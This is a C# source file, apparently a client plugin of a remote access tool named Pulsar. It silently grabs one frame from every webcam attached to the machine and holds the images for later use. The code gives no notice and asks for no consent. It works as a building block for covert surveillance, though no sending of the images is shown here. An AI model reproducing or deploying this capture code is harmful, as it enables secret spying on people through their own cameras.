using System;
using System.Collections.Concurrent;
using System.Drawing;
using AForge.Video;
using AForge.Video.DirectShow;
using System.Threading.Tasks;

namespace Pulsar.Plugin.UserCheck.Client
{
    class WebcamSnapshot
    {
        public ConcurrentDictionary<string, Bitmap> Frames = new ConcurrentDictionary<string, Bitmap>();

        public async Task CaptureSingleFrameFromAllDevices()
        {
            var devices = new FilterInfoCollection(FilterCategory.VideoInputDevice);
            var tasks = new Task[devices.Count];

            for (int i = 0; i < devices.Count; i++)
            {
                var dev = devices[i];
                tasks[i] = CaptureOnce(dev.MonikerString, dev.Name);
            }

            await Task.WhenAll(tasks);
        }

        private Task CaptureOnce(string moniker, string name)
        {
            var tcs = new TaskCompletionSource<bool>();
            var videoSource = new VideoCaptureDevice(moniker);

            NewFrameEventHandler handler = null;
            DateTime startTime = DateTime.Now;
            handler = (s, e) =>
            {
                if ((DateTime.Now - startTime).TotalSeconds < 1.5)
                    return;

                try
                {
                    var bmp = (Bitmap)e.Frame.Clone();
                    Frames[name] = bmp;
                }
                finally
                {
                    videoSource.NewFrame -= handler;
                    videoSource.SignalToStop();
                    videoSource.WaitForStop();
                    tcs.TrySetResult(true);
                }
            };

            videoSource.NewFrame += handler;
            videoSource.Start();

            Task.Delay(3000).ContinueWith(_ =>
            {
                if (!tcs.Task.IsCompleted)
                {
                    try
                    {
                        videoSource.NewFrame -= handler;
                        videoSource.SignalToStop();
                    }
                    catch { }
                    tcs.TrySetResult(false);
                }
            });

            return tcs.Task;
        }
    }
}